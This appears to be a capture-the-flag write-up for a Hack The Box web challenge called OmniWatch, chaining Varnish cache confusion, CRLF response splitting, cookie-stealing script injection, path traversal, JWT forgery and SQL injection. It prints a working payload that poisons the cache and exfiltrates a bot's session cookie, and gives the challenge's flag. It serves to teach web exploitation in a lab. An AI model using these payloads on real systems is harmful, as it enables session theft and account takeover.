# OmniWatch

**Event:** HTB MCP TryOut · **Category:** web · **Points:** 1000 · **Difficulty:** very easy

## TL;DR

Six-stage chain across a Varnish cache, a Zig HTTP server, a Flask app, and a Selenium bot. Varnish keys its cache by a single request header and nothing else. Inject CRLF into a header reflected by the Zig oracle, poison the cache with HTML that runs in the bot's session, exfiltrate the moderator JWT, leak the JWT signing secret via a path-traversal on a firmware endpoint, then forge an admin JWT and SQLi the matching signature into the database.

## What I saw first

Reading the Varnish VCL is where the chain starts. The cache key is computed entirely from the `CacheKey` request header. There is no URL, no Host, no method. That is a textbook cache-confusion bug. The Zig oracle reflects a URL segment into a `DeviceId` response header. The Flask app has a bot that logs in every thirty seconds and visits the cached pages. The flag lives at `/controller/admin`, gated by a JWT with `account_type=administrator` and a matching signature in the database.

## What I tried that did not work

The first attempt poisoned the cache via `/oracle/json/<payload>`. The Zig route for JSON calls `res.json()`, which adds its own `Content-Type: application/json` header that beats my injected `text/html`. Browser refused to render the cached blob as HTML. I lost twenty minutes before reading the Zig source again and noticing the `/oracle/html/` route writes `res.body` directly without setting a Content-Type. That is the one I needed.

The second snag was the bot's `fetch` request: Varnish's built-in `vcl_recv` passes through any request with a Cookie or Authorization header, which bypasses the cache. The fix is `credentials: 'omit'` on the bot's exfil fetch so Varnish caches the response.

## What worked

```python
# 1. Poison Varnish cache with HTML that
#    (a) contains a fake login form so the bot's selenium can still complete its flow
#    (b) runs a fetch that exfiltrates document.cookie via a second CRLF injection
html = (
  "<form id=f method=POST action=/controller/login>"
  "<input id=username name=username><input id=password name=password>"
  "<button id=login-btn type=submit></button></form>"
  "<script>if(document.cookie)"
  "fetch('/oracle/json/'+encodeURIComponent(document.cookie)+"
  "'%0D%0ACacheKey:%20enable',"
  "{headers:{'CacheKey':'leak'},credentials:'omit'});</script>"
)
inject = f"x\r\nContent-Type: text/html\r\nCacheKey: enable\r\nContent-Length: {len(html)}\r\n\r\n{html}"

# 2. Request /oracle/html/<urlencoded inject> every five seconds to keep the cache warm.
# 3. Read /oracle/json/probe with CacheKey: leak to pull the bot's cached cookie out of the DeviceId header.
# 4. Use the leaked moderator JWT to POST /controller/firmware with patch=/app/jwt_secret.txt,
#    which path-traverses and returns the 8-byte HMAC secret.
# 5. Forge an admin JWT. SQLi the device endpoint to UPDATE signatures SET signature=<forged>
#    WHERE user_id=1, because multi-statement queries are enabled.
# 6. GET /controller/admin with the forged JWT.
```

## Flag

`HTB{h3110_41w4y5_i_s3e_y0u4nd_1m_w4tch1ng_08548c1ce5447f80fabcdbea5d14412b}`

## What this taught me

A few patterns, all of which I am now scanning for first on any web stack with a reverse-proxy layer.

`hash_data(req.http.X)` with no URL or Host fallback is a universal cache-confusion bug. Anyone who can set `X` can swap responses across users.

CRLF injection into a reflected header, combined with a cache that you control, is response-splitting that survives across requests.

The route choice matters when the server uses a serialization helper. Helpers that add a Content-Type beat the one you inject. Find the route that writes raw bytes and target that.

The fetch on the exfil leg needs `credentials: 'omit'`, otherwise the reverse-proxy passes the request through without caching the response, and the whole chain is dark.

When the DB user lacks `UPDATE users`, look for `UPDATE signatures` or its equivalent. The trust boundary often sits in a separate table that nobody thinks to lock down.
